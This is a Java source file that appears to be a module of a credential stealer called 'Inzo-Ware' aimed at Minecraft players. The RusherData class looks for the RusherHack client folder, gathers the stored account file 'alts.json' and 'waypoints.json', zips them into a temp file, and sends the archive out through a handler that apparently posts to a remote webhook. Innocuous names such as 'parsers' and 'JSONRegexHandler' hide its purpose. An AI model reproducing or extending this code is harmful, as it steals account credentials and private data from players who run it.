package com.inzo.technologies.inzoware.mc.parsers.impl;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

import com.inzo.technologies.inzoware.mc.parsers.JSONObject;
import com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler;
import com.inzo.technologies.inzoware.mc.parsers.util.FileSystemHelper;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;

public final class RusherData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[]{"alts.json", "waypoints.json"};

    @Override
    public void handle() {
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String rusherFolder = mcFolder + "rusherhack/";
        if (!Files.exists(Paths.get(rusherFolder))) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the RusherHack folder.").build());
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>(); 
        for (String fileName : IMPORTANT_FILES) {
            String dir = rusherFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + sep + "rusher_INZO-WARE.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "RusherData";
    }
}